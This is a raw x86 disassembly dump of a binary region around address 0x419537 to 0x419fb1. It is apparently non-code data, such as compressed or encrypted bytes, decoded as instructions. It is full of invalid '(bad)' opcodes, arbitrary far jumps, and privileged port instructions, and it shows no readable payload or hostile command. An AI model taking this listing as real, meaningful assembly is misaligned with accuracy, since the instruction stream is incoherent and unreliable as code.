  419537:	add    al,0x5
  419539:	xchg   esi,eax
  41953a:	push   ebx
  41953b:	push   ebx
  41953c:	out    dx,al
  41953d:	push   ds
  41953e:	add    BYTE PTR [edi-0x4c],dh
  419541:	aaa    
  419542:	mov    WORD PTR [edi+0x3ef167cd],ds
  419548:	js     0x4194d0
  41954a:	and    al,cl
  41954c:	fimul  DWORD PTR [edx]
  41954e:	jge    0x41957d
  419550:	test   BYTE PTR [esi+esi*8],ch
  419553:	test   DWORD PTR [edi-0x2e],esi
  419556:	into   
  419557:	sti    
  419558:	xchg   bl,bl
  41955a:	or     eax,esp
  41955c:	fdiv   st,st(3)
  41955e:	adc    bl,ah
  419560:	add    eax,0x40a23964
  419565:	and    dl,BYTE PTR [esi-0x7969f550]
  41956b:	enter  0x4202,0x48
  41956f:	in     eax,dx
  419570:	(bad)  
  419572:	mov    ecx,0x260a6e1d
  419577:	add    edx,esp
  419579:	xchg   BYTE PTR [esi+0x1fb28048],al
  41957f:	mov    ebx,0x90785260
  419584:	(bad)  [ebx-0x592b7a90]
  41958a:	sahf   
  41958b:	cmp    DWORD PTR [edi+0x73],eax
  41958e:	mov    ch,0x7b
  419590:	xchg   ecx,eax
  419591:	cmp    eax,ebp
  419593:	adc    bh,BYTE PTR cs:[ebx]
  419596:	pop    esi
  419597:	and    BYTE PTR [ecx],bl
  419599:	push   ebx
  41959a:	sbb    dl,BYTE PTR [edi+0x13]
  41959d:	pop    ss
  41959e:	loopne 0x4195bc
  4195a0:	mul    BYTE PTR [edx]
  4195a2:	not    edi
  4195a4:	push   edi
  4195a5:	test   DWORD PTR [ebx],edi
  4195a7:	or     eax,0x4266e1aa
  4195ac:	add    bl,0x60
  4195af:	adc    eax,0x8c3a9549
  4195b4:	les    edx,FWORD PTR [eax-0x4f]
  4195b7:	mov    ecx,0xe2bd52af
  4195bc:	test   esi,ebx
  4195be:	adc    eax,0x44874be9
  4195c3:	and    BYTE PTR [ecx],0x61
  4195c6:	pop    ebp
  4195c7:	mov    ecx,0x164362da
  4195cc:	gs cmp al,0xa9
  4195cf:	rcl    BYTE PTR [edx-0x4d90392c],0x66
  4195d6:	out    dx,eax
  4195d7:	jle    0x419647
  4195d9:	out    dx,al
  4195da:	mov    ah,0xaa
  4195dc:	xchg   edi,eax
  4195dd:	fwait
  4195de:	jno    0x419590
  4195e0:	popf   
  4195e1:	hlt    
  4195e2:	cli    
  4195e3:	je     0x419630
  4195e5:	pushf  
  4195e6:	cmp    DWORD PTR [edx],0x23
  4195e9:	sbb    DWORD PTR [esi+eiz*1+0xcf],ecx
	...
  419654:	add    BYTE PTR [eax],al
  419656:	scas   eax,DWORD PTR es:[edi]
  419657:	aam    0x8d
  419659:	(bad)  
  41965a:	(bad)  
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	push   edx
  419663:	sub    al,0x55
  419665:	inc    esp
  419666:	sub    eax,0xff000111
  41966b:	add    BYTE PTR [eax],al
  41966d:	add    ch,bl
  41966f:	out    dx,al
  419670:	cmp    al,BYTE PTR [ebp-0x74]
  419673:	xor    BYTE PTR [edx+0x3ae920e8],0x89
  41967a:	inc    ebp
  41967b:	stos   BYTE PTR es:[edi],al
  41967c:	sbb    BYTE PTR [ebx+eiz*2+0xe97bfa],0x72
  419684:	mov    eax,0x25f798da
  419689:	dec    esp
  41968a:	ins    DWORD PTR es:[edi],dx
  41968b:	loop   0x41964c
  41968d:	ins    BYTE PTR es:[edi],dx
  41968e:	fcmovbe st,st(7)
  419690:	pop    ss
  419691:	sbb    ebx,edx
  419693:	pop    ss
  419694:	mov    ecx,0x6fced870
  419699:	push   cs
  41969a:	daa    
  41969b:	std    
  41969c:	gs enter 0x9d1d,0xc0
  4196a1:	lea    edi,[esi-0x20a3160e]
  4196a7:	adc    eax,0xb3d5304d
  4196ac:	cdq    
  4196ad:	mov    dh,0x4f
  4196af:	adc    ch,BYTE PTR [edi-0x18]
  4196b2:	mul    DWORD PTR [ebx]
  4196b4:	dec    edx
  4196b5:	cli    
  4196b6:	mov    edi,DWORD PTR [edi+0x24]
  4196b9:	out    0x78,eax
  4196bb:	inc    ebx
  4196bc:	neg    BYTE PTR [edx+0x4]
  4196bf:	sub    ebp,DWORD PTR [edi+ebp*2]
  4196c2:	popa   
  4196c3:	clc    
  4196c4:	inc    esi
  4196c5:	movsx  eax,WORD PTR ds:0x46ce4f41
  4196cc:	fdivr  DWORD PTR [eax]
  4196ce:	daa    
  4196cf:	adc    eax,0xe36c8edc
  4196d4:	xor    al,0x6a
  4196d6:	(bad)  
  4196d7:	out    0xdf,al
  4196d9:	xchg   esp,eax
  4196da:	inc    ebx
  4196db:	leave  
  4196dc:	jne    0x41966a
  4196de:	emms   
  4196e0:	pushf  
  4196e1:	inc    esp
  4196e2:	adc    esi,DWORD PTR [edx+0x19]
  4196e5:	repz fwait
  4196e7:	(bad)
  4196eb:	fistp  WORD PTR [edi-0x3627099d]
  4196f1:	cdq    
  4196f2:	jge    0x419737
  4196f4:	xor    eax,0x3778bc1c
  4196f9:	xor    edx,DWORD PTR [esi]
  4196fb:	fs test eax,0xed9bea46
  419701:	and    eax,0x268546f1
  419706:	inc    BYTE PTR [edx]
  419708:	aam    0xa8
  41970a:	jge    0x41969b
  41970c:	push   edi
  41970d:	mov    edi,DWORD PTR [ebx]
  41970f:	xchg   esi,eax
  419710:	ins    BYTE PTR es:[edi],dx
  419711:	fidivr WORD PTR [ecx-0x26cb570c]
  419717:	out    dx,al
  419718:	mov    al,ds:0xfebd5f1d
  41971d:	ins    DWORD PTR es:[edi],dx
  41971e:	in     al,dx
  41971f:	jecxz  0x4196b8
  419721:	pop    ebx
  419722:	xchg   DWORD PTR [eax-0x3ab532f],ebx
  419728:	stos   DWORD PTR es:[edi],eax
  419729:	pop    ds
  41972a:	cwde   
  41972b:	and    esp,DWORD PTR [ecx]
  41972d:	div    edx
  41972f:	(bad)  
  419730:	mov    DWORD PTR [eax-0x6e0d3c2e],ebx
  419736:	push   cs
  419737:	cmp    eax,0x3bba1b48
  41973c:	fisubr DWORD PTR [ecx-0x23]
  41973f:	(bad)  
  419740:	sti    
  419741:	dec    ebx
  419742:	sbb    al,al
  419744:	scas   al,BYTE PTR es:[edi]
  419745:	out    dx,al
  419746:	arpl   WORD PTR [ebx+edi*8],cx
  419749:	in     eax,0x78
  41974b:	adc    dh,BYTE PTR [edx]
  41974d:	cmp    esp,esi
  41974f:	sub    ebx,DWORD PTR [ebx-0x2844a6c4]
  419755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419756:	lods   eax,DWORD PTR ds:[esi]
  419757:	inc    ecx
  419758:	and    BYTE PTR [ebx],0x14
  41975b:	dec    eax
  41975c:	(bad)  
  41975d:	jle    0x41975b
  41975f:	fidivr DWORD PTR [esi]
  419761:	sahf   
  419762:	mov    ebx,DWORD PTR [esi+edi*8+0x7e6e178e]
  419769:	mov    esp,0xaf6390
	...
  4197d6:	mov    bl,0x3f
  4197d8:	jno    0x41983f
  4197da:	std    
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0xa88dd0ae
  4197e3:	jmp    0x1:0x122ce574
  4197ea:	inc    DWORD PTR [eax]
  4197ec:	add    BYTE PTR [eax],al
  4197ee:	sbb    dl,BYTE PTR [edi]
  4197f0:	xchg   ebx,eax
  4197f1:	lds    eax,FWORD PTR [edx-0x77]
  4197f4:	jo     0x419868
  4197f6:	enter  0xec11,0x67
  4197fa:	and    cl,dl
  4197fc:	sub    DWORD PTR cs:[edi+edx*8+0x7ed008ce],ebp
  419804:	adc    al,0x27
  419806:	sub    eax,0x9f0e0ed3
  41980b:	pop    ebp
  41980c:	dec    esp
  41980d:	inc    edi
  41980e:	in     al,0x4d
  419810:	adc    al,0x32
  419812:	sbb    al,0x70
  419814:	js     0x419847
  419816:	inc    edx
  419817:	rol    BYTE PTR [ebp+0x21],0xb0
  41981b:	cs call 0x81a3:0x8fbf67f
  419823:	jmp    0xce58:0x5b8a1b97
  41982a:	inc    ebx
  41982b:	test   BYTE PTR [ebp+0x136777de],ch
  419831:	ja     0x419800
  419833:	lock dec esi
  419835:	xchg   BYTE PTR [ecx+0x7a],dl
  419838:	jp     0x4197e5
  41983a:	sar    DWORD PTR [edx],1
  41983c:	and    ebp,DWORD PTR [ebp-0x39]
  41983f:	js     0x4197d6
  419841:	mov    al,ds:0x56755e6
  419846:	inc    ebp
  419847:	cwde   
  419848:	cmp    eax,0x2c6f0993
  41984d:	dec    eax
  41984e:	mov    BYTE PTR [eax+0x2f],ch
  419851:	pop    ebx
  419852:	push   0x6feec1d1
  419857:	ret    0xdb80
  41985a:	cmp    eax,DWORD PTR [eax-0x764616fd]
  419860:	test   dh,dl
  419862:	stos   DWORD PTR es:[edi],eax
  419863:	cmp    BYTE PTR [ebx+0x25d1bcd3],0x12
  41986a:	out    dx,eax
  41986b:	xor    eax,0x603c7ec2
  419870:	int    0x58
  419872:	cmp    eax,0xa8af5362
  419877:	fild   DWORD PTR [edi-0x34]
  41987a:	lea    ebx,[ebx]
  41987c:	test   eax,0x77f8df4b
  419881:	xchg   edx,eax
  419882:	sbb    esp,DWORD PTR [edx-0x760c9794]
  419888:	dec    ebx
  419889:	lods   eax,DWORD PTR ds:[esi]
  41988a:	and    al,0xac
  41988c:	mov    esi,0x30d2da98
  419891:	push   0x78536286
  419896:	out    0xf9,al
  419898:	mov    bh,0x41
  41989a:	mov    BYTE PTR [ecx+0x3f],cl
  41989d:	mov    esi,0x63ac1adb
  4198a2:	pusha  
  4198a3:	mov    ds:0x7dce046b,al
  4198a8:	shl    bl,cl
  4198aa:	jle    0x419898
  4198ac:	(bad)  
  4198ad:	call   0x21aa43cd
  4198b2:	pop    ecx
  4198b3:	int3   
  4198b4:	inc    edx
  4198b5:	push   ds
  4198b6:	mov    al,ds:0xaa64a0c3
  4198bb:	cmp    al,0xa5
  4198bd:	in     al,dx
  4198be:	int    0x41
  4198c0:	cmp    DWORD PTR [esi],eax
  4198c2:	or     cl,BYTE PTR [esi]
  4198c4:	fdiv   DWORD PTR ds:0xa1523cd6
  4198ca:	sbb    al,0x89
  4198cc:	push   0x7e59459f
  4198d1:	or     dl,BYTE PTR [edx-0x7cfcfb4b]
  4198d7:	in     eax,dx
  4198d8:	rcr    BYTE PTR [ebx],1
  4198da:	mov    ds:0xc0252ec,al
  4198df:	fprem1 
  4198e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198e2:	mov    al,dh
  4198e4:	xchg   DWORD PTR ds:0xe61c1000,ecx
  4198ea:	and    eax,0x510a
	...
  419953:	add    BYTE PTR [eax],al
  419955:	add    BYTE PTR [edx-0x201eb8e7],al
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	fstp   QWORD PTR [esi+0x2b13d727]
  419967:	adc    eax,DWORD PTR [ecx]
  419969:	add    bh,bh
  41996b:	add    BYTE PTR [eax],al
  41996d:	add    BYTE PTR [ebx],bh
  41996f:	div    BYTE PTR [esi]
  419971:	cmp    eax,0x1c48cf83
  419976:	fwait
  419977:	xchg   ebx,eax
  419978:	ss mov eax,0xd052c456
  41997e:	cld    
  41997f:	dec    ebp
  419980:	cmp    dl,al
  419982:	pop    edx
  419983:	sbb    BYTE PTR [ebx-0x7b62adea],bh
  419989:	test   DWORD PTR [ebp+0x63ba609a],0x5df46248
  419993:	cmp    eax,0xdd349c8d
  419998:	aas    
  419999:	push   edx
  41999a:	pop    ebx
  41999b:	inc    ebx
  41999c:	mov    fs,esp
  41999e:	jne    0x4199ba
  4199a0:	in     eax,dx
  4199a1:	xchg   ebp,eax
  4199a2:	mov    al,ah
  4199a4:	sub    dh,BYTE PTR [eax]
  4199a6:	ins    DWORD PTR es:[edi],dx
  4199a7:	dec    esp
  4199a8:	push   ecx
  4199a9:	ins    BYTE PTR es:[edi],dx
  4199aa:	xchg   edx,eax
  4199ab:	fidivr WORD PTR [edx]
  4199ad:	sahf   
  4199ae:	test   al,0xa8
  4199b0:	pop    edx
  4199b1:	sub    al,0x41
  4199b3:	mov    DWORD PTR [eax+0x7],ebx
  4199b6:	add    DWORD PTR [eax],0x33c1ef11
  4199bc:	jae    0x419995
  4199be:	sbb    BYTE PTR [esi+0x31],0xa7
  4199c2:	sub    eax,0x3d762dc7
  4199c7:	xor    edi,esi
  4199c9:	in     al,dx
  4199ca:	pop    edi
  4199cb:	cld    
  4199cc:	xchg   esi,eax
  4199cd:	jne    0x419a22
  4199cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199d0:	inc    edx
  4199d1:	sbb    DWORD PTR [esi-0x31936a04],ebx
  4199d7:	mov    esi,0x4fc8a22e
  4199dc:	cmp    esp,DWORD PTR [esi-0x69]
  4199df:	pop    ebx
  4199e0:	js     0x4199f7
  4199e2:	xchg   edi,eax
  4199e3:	fwait
  4199e4:	mov    dh,0x99
  4199e6:	das    
  4199e7:	or     ah,dh
  4199e9:	fwait
  4199ea:	sbb    ah,BYTE PTR [ebp-0x46]
  4199ed:	mov    cl,0xd5
  4199ef:	cmp    al,0xc
  4199f1:	ret    0x8b45
  4199f4:	jo     0x4199d9
  4199f6:	jnp    0x419a70
  4199f8:	mov    DWORD PTR [edx-0x36795f7d],esp
  4199fe:	aad    0x54
  419a00:	lock std 
  419a02:	mov    DWORD PTR [esi],ecx
  419a04:	jmp    0x664dbfd9
  419a09:	push   es
  419a0a:	pusha  
  419a0b:	mov    al,ds:0xb59ff15f
  419a10:	xor    bh,dl
  419a12:	pusha  
  419a13:	mov    esp,0x115cfc7e
  419a18:	pop    ebp
  419a19:	jp     0x419a63
  419a1b:	sbb    bl,cl
  419a1d:	sbb    eax,0xe81d7d28
  419a22:	sbb    dl,bl
  419a24:	fsubp  st(0),st
  419a26:	dec    ebx
  419a27:	jne    0x419a7f
  419a29:	dec    ecx
  419a2a:	push   eax
  419a2b:	dec    ebp
  419a2c:	xor    BYTE PTR [ebp+0x65],0xce
  419a30:	push   es
  419a31:	jo     0x419a57
  419a33:	jecxz  0x4199ff
  419a35:	dec    esp
  419a36:	fs fld1 
  419a39:	je     0x4199c9
  419a3b:	pop    ds
  419a3c:	lea    edi,[edx]
  419a3e:	mov    bh,0x42
  419a40:	pop    ecx
  419a41:	sahf   
  419a42:	popf   
  419a43:	sbb    ch,BYTE PTR [edx]
  419a45:	inc    esi
  419a46:	inc    edi
  419a47:	adc    eax,ebp
  419a49:	(bad)  [eax+ebx*8-0x3]
  419a4d:	lea    edi,[eax-0x664d8d1f]
  419a53:	jne    0x419a24
  419a55:	mov    ?,edx
  419a57:	imul   edx,DWORD PTR [ecx],0xffffff8f
  419a5a:	je     0x4199e5
  419a5c:	inc    ecx
  419a5d:	xchg   DWORD PTR [esp+edi*8+0x61cb454],ecx
  419a64:	fwait
  419a65:	mov    esi,0x99ab54f
  419a6a:	lods   eax,DWORD PTR ds:[esi]
  419a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a6c:	xor    BYTE PTR [eax],al
	...
  419ad6:	xor    esi,DWORD PTR [ecx]
  419ad8:	xchg   ebx,eax
  419ad9:	lds    edx,FWORD PTR [ebx-0x34088819]
  419adf:	rcl    DWORD PTR ds:0xe649acc2,cl
  419ae5:	mov    al,ds:0x1142a
  419aea:	inc    DWORD PTR [eax]
  419aec:	add    BYTE PTR [eax],al
  419aee:	or     ah,BYTE PTR [edx+0x4]
  419af1:	mov    dl,0x2
  419af3:	push   ds
  419af4:	xchg   esp,eax
  419af5:	xor    BYTE PTR [eax+0x58dc5037],ah
  419afb:	mov    ds:0x9eccc1b2,al
  419b00:	push   es
  419b01:	sub    dh,ah
  419b03:	sar    bh,0x57
  419b06:	jb     0x419b55
  419b08:	and    DWORD PTR ds:0x3170b866,0x1d
  419b0f:	stc    
  419b10:	addr16 mov ds:0xda4d,al
  419b14:	fst    QWORD PTR [eax]
  419b16:	aaa    
  419b17:	push   esp
  419b18:	test   al,0x2c
  419b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b1b:	int    0x52
  419b1d:	xchg   ecx,eax
  419b1e:	pop    eax
  419b1f:	mov    bl,0xb
  419b21:	out    dx,al
  419b22:	push   es
  419b23:	add    eax,0x6b9580bc
  419b28:	xchg   ebp,eax
  419b29:	pop    ebp
  419b2a:	iret   
  419b2b:	cmp    BYTE PTR [esp+eax*4],bh
  419b2e:	xchg   ebp,eax
  419b2f:	xlat   BYTE PTR ds:[ebx]
  419b30:	adc    eax,0x8a0fc3e2
  419b35:	inc    edi
  419b36:	or     BYTE PTR [ebx+0x7f319ca2],0x47
  419b3d:	addr16 jg 0x419b3f
  419b40:	jg     0x419b57
  419b42:	push   ss
  419b43:	mov    esi,0x820bf1b9
  419b48:	ret    
  419b49:	out    0x3e,al
  419b4b:	adc    ebp,DWORD PTR [esi+ebp*4]
  419b4e:	pop    edx
  419b4f:	push   0xad3686a
  419b54:	sti    
  419b55:	jnp    0x419b91
  419b57:	lods   eax,DWORD PTR gs:[esi]
  419b59:	adc    BYTE PTR [ecx-0x3c10304d],al
  419b5f:	outs   dx,BYTE PTR ds:[esi]
  419b60:	je     0x419bad
  419b62:	icebp  
  419b63:	(bad)  
  419b64:	fsubr  QWORD PTR [ebx+0x6]
  419b67:	adc    DWORD PTR [edx],esi
  419b69:	lea    ebp,[esi+ecx*4-0x1e]
  419b6d:	xchg   esp,eax
  419b6e:	add    BYTE PTR [ebp-0x28176d79],dl
  419b74:	leave  
  419b75:	sbb    bh,BYTE PTR [esi+0x333b4064]
  419b7b:	jo     0x419bfa
  419b7d:	test   DWORD PTR [ebp+0x46bf0fea],0x72d5918f
  419b87:	sub    eax,ecx
  419b89:	call   0xa830:0xafb298ab
  419b90:	sbb    BYTE PTR [ebx-0x2d27fb9],ch
  419b96:	ds push esp
  419b98:	lahf   
  419b99:	out    dx,eax
  419b9a:	popa   
  419b9b:	and    esi,DWORD PTR [esi-0x206b349a]
  419ba1:	jo     0x419bcc
  419ba3:	push   ss
  419ba4:	aas    
  419ba5:	stos   DWORD PTR es:[edi],eax
  419ba6:	jne    0x419c24
  419ba8:	jns    0x419bba
  419baa:	ins    DWORD PTR es:[edi],dx
  419bab:	mov    ecx,esi
  419bad:	in     al,0x48
  419baf:	mov    al,0x72
  419bb1:	xchg   esi,eax
  419bb2:	dec    eax
  419bb3:	pop    es
  419bb4:	sbb    eax,0xf566e94e
  419bb9:	or     eax,edi
  419bbb:	and    eax,0x215e7c1e
  419bc0:	pop    esi
  419bc1:	lods   al,BYTE PTR ds:[esi]
  419bc2:	call   0xe9ca:0x445dee
  419bc9:	ficom  WORD PTR [eax-0x6679b94e]
  419bcf:	or     BYTE PTR [ebp+0x588b2e9d],0xb7
  419bd6:	fst    st(2)
  419bd8:	test   al,0x25
  419bda:	jo     0x419c26
  419bdc:	pushf  
  419bdd:	pop    esi
  419bde:	div    DWORD PTR [edi+0xc]
  419be1:	idiv   ebp
  419be3:	loopne 0x419b97
  419be5:	das    
  419be6:	lock call 0xd6886e64
  419bec:	lods   eax,DWORD PTR ds:[esi]
	...
  419c55:	add    BYTE PTR [edx-0x3c],cl
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0xa5
  419c63:	outs   dx,BYTE PTR ds:[esi]
  419c64:	test   DWORD PTR [ebx+0x29],ebp
  419c67:	adc    eax,0xff0001
  419c6c:	add    BYTE PTR [eax],al
  419c6e:	data16 adc dl,BYTE PTR ds:0x401425f2
  419c75:	jle    0x419ce8
  419c77:	push   edx
  419c78:	call   0xe7d:0x3a315161
  419c7f:	mov    ebp,0xc12105b
  419c84:	sbb    BYTE PTR [ecx-0x5c349e94],0xf2
  419c8b:	push   esi
  419c8c:	add    al,0x83
  419c8e:	dec    esp
  419c8f:	or     DWORD PTR [ecx+0x1],edx
  419c92:	mov    eax,ds:0xf02407b
  419c97:	imul   esp,DWORD PTR [ebx],0x25
  419c9a:	mov    edx,0x4eb9c931
  419c9f:	jecxz  0x419cba
  419ca1:	fsubr  DWORD PTR [eax]
  419ca3:	test   eax,0xfb741c
  419ca8:	inc    ecx
  419ca9:	(bad)  
  419caa:	pop    edx
  419cab:	cli    
  419cac:	xor    edx,DWORD PTR [edx-0xc84d61]
  419cb2:	cdq    
  419cb3:	or     ecx,DWORD PTR [ecx-0x11]
  419cb6:	adc    DWORD PTR [ebx+0x7f],eax
  419cb9:	(bad)  
  419cba:	sbb    DWORD PTR [ebp-0x71],esp
  419cbd:	dec    eax
  419cbe:	(bad)  
  419cbf:	mov    ecx,0xc4ddd51c
  419cc4:	sub    al,0x22
  419cc6:	push   0xffffffce
  419cc8:	fld    QWORD PTR [ecx-0x52]
  419ccb:	jb     0x419c6a
  419ccd:	int3   
  419cce:	ja     0x419cc5
  419cd0:	stos   BYTE PTR es:[edi],al
  419cd1:	les    eax,FWORD PTR [eax]
  419cd3:	and    dl,BYTE PTR [ebx+0x1d]
  419cd6:	pusha  
  419cd7:	jecxz  0x419d23
  419cd9:	inc    esp
  419cda:	jmp    DWORD PTR [eax]
  419cdc:	out    0x22,eax
  419cde:	mov    edx,0x389ab991
  419ce3:	push   ebp
  419ce4:	push   ebx
  419ce5:	daa    
  419ce6:	sbb    cl,BYTE PTR [ecx]
  419ce8:	(bad)  
  419ce9:	int3   
  419cea:	mov    al,0x9
  419cec:	dec    esi
  419ced:	cmp    eax,DWORD PTR [edi-0x80]
  419cf0:	outs   dx,BYTE PTR ds:[esi]
  419cf1:	repz push 0x5d
  419cf4:	das    
  419cf5:	addr16 loop 0x419cde
  419cf8:	add    BYTE PTR [edi],dl
  419cfa:	(bad)
  419cfd:	sub    edx,DWORD PTR [edi+0x4d3a13f2]
  419d03:	pop    edi
  419d04:	mov    bl,0xb0
  419d06:	sub    ch,BYTE PTR [ebx+0x72ec7625]
  419d0c:	clc    
  419d0d:	xlat   BYTE PTR ds:[ebx]
  419d0e:	xchg   BYTE PTR [ebx+0x9],ch
  419d11:	push   esi
  419d12:	xchg   esp,eax
  419d13:	pop    ds
  419d14:	les    edx,FWORD PTR [ebx+0x3e]
  419d17:	sub    DWORD PTR [edx-0xd85f9a1],esi
  419d1d:	adc    BYTE PTR [esi-0x16de9a6b],ch
  419d23:	shl    DWORD PTR ds:0x62fc1d63,cl
  419d29:	fidiv  DWORD PTR ds:0xa6c75672
  419d2f:	inc    ebx
  419d30:	pop    esi
  419d31:	sbb    ah,BYTE PTR [ecx-0x6]
  419d34:	clc    
  419d35:	pop    edx
  419d36:	mov    cl,0x4b
  419d38:	sbb    DWORD PTR [esp+edx*1-0x53cb5da0],esi
  419d3f:	xchg   ecx,eax
  419d40:	mov    edx,0x6b83e1b1
  419d45:	sbb    ebp,ebx
  419d47:	fistp  WORD PTR [ecx]
  419d49:	test   DWORD PTR [edx],edx
  419d4b:	xchg   al,bl
  419d4d:	repnz and DWORD PTR [esi],0xd1ef2001
  419d54:	sti    
  419d55:	mov    cl,0x2
  419d57:	xchg   BYTE PTR [eax],dl
  419d59:	add    edx,DWORD PTR [esi]
  419d5b:	cmovs  ebx,DWORD PTR [ebp+ebp*8+0x4ba0272d]
  419d63:	mov    cl,0x68
  419d65:	push   eax
  419d66:	add    DWORD PTR [esi+0x38903193],eax
  419d6c:	dec    edx
	...
  419dd5:	add    al,dh
  419dd7:	xchg   edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	fidiv  DWORD PTR ss:[edx+0x49]
  419de4:	es sub BYTE PTR ds:[esi],dl
  419de8:	add    DWORD PTR [eax],eax
  419dea:	inc    DWORD PTR [eax]
  419dec:	add    BYTE PTR [eax],al
  419dee:	push   esi
  419def:	mov    ebx,?
  419df1:	rcl    DWORD PTR [ecx+0x3b],1
  419df4:	sbb    esp,DWORD PTR [ebp-0x67]
  419df7:	adc    esp,esp
  419df9:	mov    eax,0xc86d9f89
  419dfe:	xchg   ebp,eax
  419dff:	jl     0x419d85
  419e01:	jecxz  0x419da2
  419e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e04:	xor    al,BYTE PTR [eax-0x3b00e692]
  419e0a:	pop    ecx
  419e0b:	inc    ebp
  419e0c:	or     DWORD PTR [eax],ebx
  419e0e:	cmp    eax,0xa91c4868
  419e13:	jo     0x419dab
  419e15:	push   ss
  419e16:	loopne 0x419e88
  419e18:	cmp    BYTE PTR [edx],ch
  419e1a:	fnstenv [edx-0x3b]
  419e1d:	popf   
  419e1e:	mov    ch,0xaa
  419e20:	xlat   BYTE PTR ds:[ebx]
  419e21:	in     eax,0x8b
  419e23:	ins    BYTE PTR es:[edi],dx
  419e24:	and    cl,dh
  419e26:	jno    0x419de5
  419e28:	cmc    
  419e29:	inc    esi
  419e2a:	mov    cl,BYTE PTR [ecx-0x1c]
  419e2d:	xlat   BYTE PTR ds:[ebx]
  419e2e:	mov    cl,cl
  419e30:	loop   0x419e6f
  419e32:	xchg   ebp,eax
  419e33:	or     al,BYTE PTR [ebp+0x76]
  419e36:	cmp    BYTE PTR es:[ebx-0x6e],dl
  419e3a:	cli    
  419e3b:	and    BYTE PTR [ebp+0x3e],0x7e
  419e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e40:	ins    DWORD PTR es:[edi],dx
  419e41:	add    BYTE PTR [edx-0x4f],0xc0
  419e45:	push   ebx
  419e46:	lea    eax,[ebx+0x54]
  419e49:	mov    edi,0x5a4df654
  419e4e:	call   FWORD PTR [ecx+0x38]
  419e51:	xchg   edi,eax
  419e52:	sbb    al,0xfa
  419e54:	and    DWORD PTR [edi],esp
  419e56:	call   0xd607:0x858f0c0f
  419e5d:	or     DWORD PTR ds:[edx],ecx
  419e60:	test   BYTE PTR [eax],bh
  419e62:	fwait
  419e63:	(bad)  
  419e64:	jmp    0x4a4e:0x78c51027
  419e6b:	or     ch,bh
  419e6d:	xchg   BYTE PTR [eax],dh
  419e6f:	cmp    al,dl
  419e71:	push   0xffffffd1
  419e73:	ja     0x419e19
  419e75:	fistp  QWORD PTR [ecx-0x11e677ce]
  419e7b:	xchg   esp,eax
  419e7c:	into   
  419e7d:	ds push 0x6f
  419e80:	xchg   esi,eax
  419e81:	ss stc 
  419e83:	xchg   edi,eax
  419e84:	repz loop 0x419e9b
  419e87:	daa    
  419e88:	mov    edi,0xa713b65f
  419e8d:	std    
  419e8e:	sbb    al,0x41
  419e90:	mov    dh,0xde
  419e92:	jmp    0xc25c:0xcdd36fe8
  419e99:	dec    esp
  419e9a:	or     al,0xc7
  419e9c:	or     cl,BYTE PTR [ebp+0x31]
  419e9f:	cmp    BYTE PTR [ecx+0x6f95b160],cl
  419ea5:	fcmovne st,st(1)
  419ea7:	test   eax,0xb46ee1a2
  419eac:	(bad)  
  419eae:	adc    ch,BYTE PTR [edi-0x4c487f5a]
  419eb4:	dec    esp
  419eb5:	stos   BYTE PTR es:[edi],al
  419eb6:	push   ds
  419eb7:	std    
  419eb8:	gs push ebp
  419eba:	jns    0x419f34
  419ebc:	fnstsw WORD PTR [esi-0x60]
  419ebf:	sahf   
  419ec0:	mov    eax,ds:0x119e1044
  419ec5:	dec    ebp
  419ec6:	fiadd  WORD PTR [ecx+0x8]
  419ec9:	add    bl,BYTE PTR [ebx]
  419ecb:	push   0x60d9f7c
  419ed0:	cli    
  419ed1:	pop    edx
  419ed2:	aas    
  419ed3:	lods   eax,DWORD PTR ds:[esi]
  419ed4:	push   ss
  419ed5:	imul   eax,DWORD PTR [ecx-0x32],0x24
  419ed9:	sub    al,BYTE PTR [eax]
  419edb:	mov    ds:0x2434a58,al
  419ee0:	stos   BYTE PTR es:[edi],al
  419ee1:	lds    ecx,FWORD PTR [edx+0x5]
  419ee4:	sub    al,0x6b
  419ee6:	into   
  419ee7:	loopne 0x419f31
  419ee9:	pop    eax
  419eea:	int3   
  419eeb:	xchg   edx,eax
  419eec:	imul   eax,DWORD PTR [eax],0x0
	...
  419f53:	add    BYTE PTR [eax],al
  419f55:	add    BYTE PTR [edi+0x5fc517d8],al
  419f5b:	iret   
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419f61:	inc    esi
  419f62:	mov    dl,0x2f
  419f64:	rol    edx,1
  419f66:	daa    
  419f67:	pop    ss
  419f68:	add    DWORD PTR [eax],eax
  419f6a:	inc    DWORD PTR [eax]
  419f6c:	add    BYTE PTR [eax],al
  419f6e:	aam    0x61
  419f70:	inc    BYTE PTR [esi]
  419f72:	call   0xca73:0x6e8b0a99
  419f79:	test   ecx,edx
  419f7b:	clc    
  419f7c:	(bad)  
  419f7e:	add    al,0x5c
  419f80:	sar    DWORD PTR [esi-0x50bc948c],0x49
  419f87:	or     al,al
  419f89:	sub    al,0x25
  419f8b:	nop
  419f8c:	call   0x75901562
  419f91:	fwait
  419f92:	adc    cl,BYTE PTR ds:0xb0f5e0a4
  419f98:	scas   eax,DWORD PTR es:[edi]
  419f99:	adc    ebx,ecx
  419f9b:	vmread DWORD PTR [ecx-0x55],ecx
  419f9f:	dec    ecx
  419fa0:	nop
  419fa1:	shr    cl,cl
  419fa3:	add    eax,0xd17a11ef
  419fa8:	cwde   
  419fa9:	mov    dh,0x6d
  419fab:	add    BYTE PTR [eax+ecx*2],cl
  419fae:	ret    
  419faf:	jae    0x419f4a
  419fb1:	dec    esp
